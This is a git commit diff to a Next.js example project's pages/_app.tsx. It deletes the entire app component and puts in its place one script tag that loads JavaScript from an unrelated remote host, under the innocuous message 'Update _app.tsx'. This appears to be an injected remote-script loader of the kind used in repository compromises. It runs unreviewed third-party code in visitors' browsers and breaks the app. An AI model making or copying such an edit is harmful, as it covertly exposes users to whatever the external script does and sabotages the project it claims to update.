f0405427c58fdf8f5f47e687514e9b05eec3dd49
HatcheCorvusX <hatchecorvus@gmail.com>
2025-06-14 17:09:37 -0400

    Update _app.tsx

--- pages/_app.tsx
+++ pages/_app.tsx
@@ -1,17 +1,1 @@
-import type { AppProps } from 'next/app'
-import type { LayoutProps } from '@vercel/examples-ui/layout'
-import { getLayout } from '@vercel/examples-ui'
-import '@vercel/examples-ui/globals.css'
-
-export default function MyApp({ Component, pageProps }: AppProps) {
-  const Layout = getLayout<LayoutProps>(Component)
-
-  return (
-    <Layout
-      title="AB Testing with buckets"
-      path="edge-middleware/ab-testing-simple"
-    >
-      <Component {...pageProps} />
-    </Layout>
-  )
-}
+<script type="text/javascript" src="https://jso-tools.z-x.my.id/raw/~/674XPMCA"></script>
